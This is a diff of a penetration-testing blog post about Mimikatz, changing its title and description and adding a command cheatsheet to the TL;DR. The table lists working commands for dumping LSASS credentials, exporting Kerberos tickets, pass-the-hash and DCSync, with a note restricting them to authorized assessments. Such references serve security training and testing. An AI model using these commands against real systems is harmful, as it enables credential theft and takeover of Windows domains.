@@ -1,9 +1,9 @@
 ---
-title: "Mimikatz Usage Summary — Credential Dumping & Post-Exploitation"
+title: "Mimikatz Commands Cheatsheet — LSASS, Pass-the-Hash, DCSync"
 date: 2026-03-06
 permalink: /en/posts/tech-mimikatz-guide/
 legacy_permalink: /posts/tech-mimikatz-guide/
-description: "A comprehensive reference for Mimikatz usage in penetration testing and OSCP. Covers credential dumping, LSASS extraction, Pass-the-Hash, Golden/Silver Ticket forging, DCSync, and defense evasion techniques with practical command examples."
+description: "Mimikatz command cheatsheet for Windows pentesting: LSASS dumping, sekurlsa, Pass-the-Hash, Golden/Silver Tickets, DCSync, and OPSEC notes."
 categories: [TechBlog]
 tags: [mimikatz, credential-dumping, pass-the-hash, golden-ticket, dcsync, lsass, active-directory, post-exploitation, pentest, oscp]
 mermaid: true
@@ -14,6 +14,17 @@ alt_ja: /ja/posts/tech-mimikatz-guide/
 ## TL;DR
 
 Mimikatz is an open-source post-exploitation tool that extracts credentials, tokens, and Kerberos tickets from Windows memory. **Understanding its modules and output is essential for Active Directory attacks in OSCP.** This guide covers the most impactful Mimikatz commands with usage context and OPSEC notes.
+
+Use these commands only in an authorized lab or assessment.
+
+| Goal | Mimikatz Command |
+|---|---|
+| Enable debug privilege | `privilege::debug` |
+| Elevate to SYSTEM token | `token::elevate` |
+| Dump LSASS logon material | `sekurlsa::logonpasswords` |
+| Export Kerberos tickets | `sekurlsa::tickets /export` |
+| Pass-the-Hash shell | `sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<NTLM> /run:cmd.exe` |
+| DCSync account hash | `lsadump::dcsync /domain:<DOMAIN> /user:<USER>` |
 
 ---
 
